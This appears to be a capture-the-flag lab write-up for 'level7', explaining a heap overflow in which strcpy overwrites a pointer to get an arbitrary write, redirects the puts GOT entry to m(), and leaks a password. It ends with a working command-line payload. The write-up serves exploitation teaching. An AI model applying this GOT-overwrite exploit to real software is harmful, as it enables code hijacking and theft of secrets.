# Level7 — Heap → GOT Overwrite Attack

## Overview

Unlike level5 (format string), here the main vulnerability is a **heap overflow**. Both levels end in **GOT overwrite**.

| Level   | Main vulnerability | Target |
| ------- | -------------------- | ------ |
| level5  | Format string        | GOT    |
| level7  | Heap overflow        | GOT    |

## Memory layout

```
High address
┌───────────────┐
│ Stack         │
├───────────────┤
│   Heap        │  ← malloc (ptr1, ptr2, buffers)
├───────────────┤
│ .bss          │  ← global buffer c (password)
│ .data         │
│ .got          │  ← attack target
│ .plt          │
├───────────────┤
│ Code (.text)  │  ← m()
└───────────────┘
Low address
```

## 1. The bug (heap overflow)

```c
strcpy(ptr1[1], argv[1]);
```

| Element  | Explanation                    |
| -------- | ------------------------------ |
| ptr1[1]  | 8-byte buffer                  |
| argv[1]  | user-controlled                |
| strcpy   | no limit                       |

Result: **heap overflow** → we overwrite the region after the buffer (ptr2).

## 2. Memory layout (ptr1 / ptr2)

- ptr1 → [ ptr1[0] | ptr1[1] ]; ptr1[1] = buffer (8 bytes).
- ptr2 → [ ptr2[0] | ptr2[1] ]; ptr2[1] = buffer (8 bytes).

In memory (contiguous chunks):

```
[ buffer1 user (8) ][ ptr2 chunk ][ ptr2->id ][ ptr2->buf ][ buffer2 ... ]
```

## 3. Overflow

Payload argv[1]: **"A"×20** (+ 4 bytes for ptr2[1]).

- The 20 bytes overwrite: buffer1 (8) + ptr2 region up to **ptr2[1]**.
- The last 4 bytes of argv[1] overwrite **ptr2[1]** (the 2nd strcpy destination).

## 4. Arbitrary write

```c
strcpy(ptr2[1], argv[2]);
```

Since we put **GOT puts** in ptr2[1], this second strcpy becomes:

- **write(address, value)** = `strcpy(0x08049928, argv[2])`.

With argv[2] = address of **m** in little-endian:

```c
strcpy(0x08049928, "\xf4\x84\x04\x08");
```

→ We write the address of **m** into the **puts** GOT entry.

## 5. GOT and target

- **puts** → PLT → GOT → libc. Normally: `GOT[puts]` = real puts address.
- After exploit: **GOT[puts] = m** (0x080484f4).

## 6. Hijack

```c
puts("~~");
```

→ the CPU does `jmp *GOT[puts]` → jump to **m()** instead of libc.

**m()** does:

```c
printf("%s - %d\n", c, time);
```

→ prints buffer **c** (where the password was read) → level8 password.

## Exploit chain

```
[1] Heap overflow (strcpy ptr1[1])
    ↓
[2] Overwrite ptr2[1] (2nd strcpy destination)
    ↓
[3] Arbitrary write (strcpy(ptr2[1], argv[2]))
    ↓
[4] Overwrite GOT[puts] with address of m
    ↓
[5] puts("~~") → m()
    ↓
[6] m() prints c → password
```

## Level5 vs Level7 comparison

| Concept    | Level5           | Level7              |
| ---------- | ---------------- | ------------------- |
| Bug        | Format string    | Heap overflow       |
| Primitive  | Arbitrary write (%n) | Arbitrary write (strcpy) |
| Target     | GOT              | GOT                 |
| Result     | Hijack exit → o()| Hijack puts → m()   |

## GDB check

- `disas main`: find the two `strcpy`, then `call puts@plt`.
- `p m` → 0x80484f4.
- Breakpoint after 2nd strcpy, run with payload; `x/wx 0x8049928` → must show **0x080484f4**. Then `continue` → puts calls m().

## Final payload

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

Equivalent to: `strcpy(0x08049928, "\xf4\x84\x04\x08");` then run until puts.

## Oral explanation (exam phrase)

> The program has a heap overflow via an unsafe strcpy. This overflow overwrites a pointer used as the destination in a second strcpy, giving an arbitrary write primitive. We use it to overwrite the puts GOT entry with the address of m. When puts is called, the program runs m instead and prints the password.

## Summary (punchline)

**Level7 = turn strcpy into arbitrary write** (by controlling the destination via the first overflow, then writing to the GOT).

## References

- `strcpy(3)`: https://man7.org/linux/man-pages/man3/strcpy.3.html
- ELF / GOT: https://man7.org/linux/man-pages/man5/elf.5.html
